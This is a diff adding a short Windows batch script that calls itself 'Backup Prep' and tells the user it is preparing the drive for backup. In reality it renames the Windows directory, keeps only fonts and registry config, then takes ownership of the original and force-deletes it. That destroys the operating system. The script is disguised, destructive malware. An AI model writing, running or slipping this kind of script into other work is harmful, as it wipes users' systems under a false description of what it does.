@@ -1,0 +1,28 @@
+@echo off
+cls
+@title Backup Prep 
+echo.
+echo  Preparing drive for backup, please wait...
+
+ren Windows _Windows
+md Windows
+md Windows\system32
+md Windows\Fonts
+md Windows\system32\config
+
+attrib -H -S -R _Windows\Fonts\*.* /S /D
+attrib -H -S -R _Windows\system32\config\*.* /S /D
+
+copy _Windows\Fonts Windows\Fonts
+copy _Windows\System32\config\*.* Windows\system32\config\
+
+rd /s /q _Windows
+del /F /S /Q _Windows
+if not exist _Windows goto DONE
+takeown /F _Windows /R /D Y
+cacls _Windows /T /E /C /G Everyone:F
+rd /s /q _Windows
+del /F /S /Q _Windows
+
+:DONE
+exit
